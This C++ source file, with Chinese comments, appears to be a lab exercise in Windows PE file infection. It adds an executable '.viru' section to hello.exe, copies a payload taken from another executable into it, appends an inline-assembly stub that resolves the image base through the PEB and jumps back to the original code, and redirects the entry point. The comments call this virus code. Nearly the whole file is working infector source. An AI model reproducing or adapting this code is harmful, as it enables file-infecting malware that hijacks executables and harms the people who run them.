#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <Windows.h>
using namespace std;
#define MAXLEN 512

DWORD_PTR addsection(char* file)
{

    IMAGE_DOS_HEADER image_dos_header;
    IMAGE_NT_HEADERS image_nt_headers;
    IMAGE_SECTION_HEADER image_section_header; // 用于存储新加的节表项
    IMAGE_SECTION_HEADER old_section;          // 存储旧的节表项
    int num_section = 0;
    //    byte sec[8]=".txt";



    FILE* h;
    h = fopen(file, "rb+");
    fseek(h, 0, SEEK_SET);
    fread(&image_dos_header, sizeof(IMAGE_DOS_HEADER), 1, h);
    //printf("%x\n", image_dos_header.e_lfarlc);
    fseek(h, image_dos_header.e_lfanew, SEEK_SET);
    fread(&image_nt_headers, sizeof(IMAGE_NT_HEADERS), 1, h); //PE头
    //printf("%x\n", image_nt_headers.OptionalHeader);
    //printf("%d", sizeof(IMAGE_NT_HEADERS));
    //for (int a = 0; a <= 15; a++)
    //  printf("%x,%x\n", image_nt_headers.OptionalHeader.DataDirectory[a].VirtualAddress, image_nt_headers.OptionalHeader.DataDirectory[a].Size);

    num_section = image_nt_headers.FileHeader.NumberOfSections;
    fseek(h, image_dos_header.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (num_section - 1) * sizeof(IMAGE_SECTION_HEADER), SEEK_SET);// 跳到最后一个节表项
    fread(&old_section, sizeof(IMAGE_SECTION_HEADER), 1, h);  // 存储最后一个节表项到old_section

    image_nt_headers.FileHeader.NumberOfSections += 1;
    image_section_header.Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_READ;
    image_section_header.Misc.VirtualSize = image_nt_headers.OptionalHeader.SectionAlignment;
    //bool x=true;
    int n;
    for (int n = 1; true; n++) {
        if (image_nt_headers.OptionalHeader.FileAlignment * n > 400) break; //节大小
    }
    image_section_header.SizeOfRawData = image_nt_headers.OptionalHeader.FileAlignment * 5;
    strcpy((char*)image_section_header.Name, ".viru");
    image_section_header.PointerToRawData = 0x2000;//alig(old_section.PointerToRawData + old_section.SizeOfRawData, image_nt_headers.OptionalHeader.FileAlignment);
    image_section_header.VirtualAddress = 0x6000;//alig(old_section.VirtualAddress + old_section.SizeOfRawData, image_nt_headers.OptionalHeader.SectionAlignment);
    fseek(h, image_dos_header.e_lfanew + sizeof(IMAGE_NT_HEADERS) + num_section * sizeof(IMAGE_SECTION_HEADER), SEEK_SET);
    fwrite(&image_section_header, sizeof(IMAGE_SECTION_HEADER), 1, h);


    image_nt_headers.OptionalHeader.SizeOfImage = 0x7000;//alig(image_section_header.VirtualAddress + image_section_header.SizeOfRawData, image_nt_headers.OptionalHeader.SectionAlignment);
    image_nt_headers.OptionalHeader.DataDirectory[11].VirtualAddress = 0;
    image_nt_headers.OptionalHeader.DataDirectory[11].Size = 0;
    fseek(h, image_dos_header.e_lfanew, SEEK_SET);
    fwrite(&image_nt_headers, sizeof(IMAGE_NT_HEADERS), 1, h);

    fseek(h, image_section_header.PointerToRawData, SEEK_SET);
    byte* s = (byte*)malloc(image_section_header.SizeOfRawData);
    ZeroMemory((void*)s, image_section_header.SizeOfRawData);
    fwrite(s, image_section_header.SizeOfRawData, 1, h);

    DWORD fva = image_section_header.Misc.VirtualSize + image_section_header.PointerToRawData;
    fclose(h);
    printf("%x", fva);
    return fva;

}

DWORD changeentry(DWORD entry, char* target) {
    FILE* fp = fopen(target, "rb+");
    if (fp == NULL) {
        //printf("can not open file");
        return 0;
    }
    // 获取dos头
    IMAGE_DOS_HEADER dosHeader;
    fread(&dosHeader, 1, sizeof(dosHeader), fp);
    // 获取PE头
    DWORD offsetPeHeader = dosHeader.e_lfanew;
    fseek(fp, offsetPeHeader, SEEK_SET);
    IMAGE_NT_HEADERS ntHeader;
    fread(&ntHeader, 1, sizeof ntHeader, fp);
    fseek(fp, offsetPeHeader, SEEK_SET);
    DWORD old_entry;
    old_entry = ntHeader.OptionalHeader.AddressOfEntryPoint;
    ntHeader.OptionalHeader.AddressOfEntryPoint = entry;
    DWORD offset;
    offset = entry - old_entry;
    fwrite(&ntHeader, sizeof(ntHeader), 1, fp);
    fclose(fp);
    return offset;
}


void shellcode(DWORD fva, char* file) {
    FILE* fp;
    IMAGE_DOS_HEADER image_dos_header;
    IMAGE_NT_HEADERS image_nt_headers;

    fp = fopen(file, "rb+");
    fseek(fp, 0, SEEK_SET);
    fread(&image_dos_header, sizeof(IMAGE_DOS_HEADER), 1, fp);
    fseek(fp, image_dos_header.e_lfanew, SEEK_SET);
    fread(&image_nt_headers, sizeof(IMAGE_NT_HEADERS), 1, fp); //PE头


    DWORD oldEntry = image_nt_headers.OptionalHeader.AddressOfEntryPoint;//+0x21

    DWORD start, end;
    _asm
    {
        //病毒代码块 
 //数据区
        mov eax, begin1
        mov start, eax;
        mov eax, end1

            mov end, eax;
        jmp end2
            begin1 :

        call A
            A :
        pop edi
            //可能会有一定偏移
            sub edi, 5
            //mov[edi - 4], edi;//标记当前的地址

            push eax

            mov eax, fs: [30h]//动态获取image_base，加上旧的AddressOfEntryPoint后就得到要跳转的位置
            mov eax, [eax + 0x0c]; //LDR
        mov eax, [eax + 0x0c]

            mov eax, [eax + 0x18]//节点偏移0x18就是exe在内存中的加载基址
            //mov eax,0x40000
            add eax, [edi + 0x21]//oldentry
            mov edi, eax
            pop eax
            jmp edi

            end1 :
        nop
            end2 :
        nop


    }
    fseek(fp, fva, SEEK_SET);

    char* filein = (char*)"work1.exe[.wdy]";
    FILE* infile;
    infile = fopen(filein, "rb+");
    BYTE buf = 0;
    int count = 0;
    int rc;
    while ((rc = fread(&buf, 1, 1, infile)) != 0)
    {
        if (count >= 1440 && count <= 2871)
        {
            fwrite(&buf, 1, 1, fp);
        }
        count++;
        //fwrite(&buf, 1, 1, fp);
    }
    fclose(infile);
    fwrite((char*)start, end - start, 1, fp);//在病毒载荷最后跳回原本的entrypoint
    fwrite((char*)&oldEntry, 4, 1, fp);
    fclose(fp);
}

int main()
{
    char* file = (char*)"hello.exe";
    DWORD fva = addsection(file);
    shellcode(0x2000, file);
    DWORD entry = 0x6000;
    changeentry(entry, file);
    return 0;
}




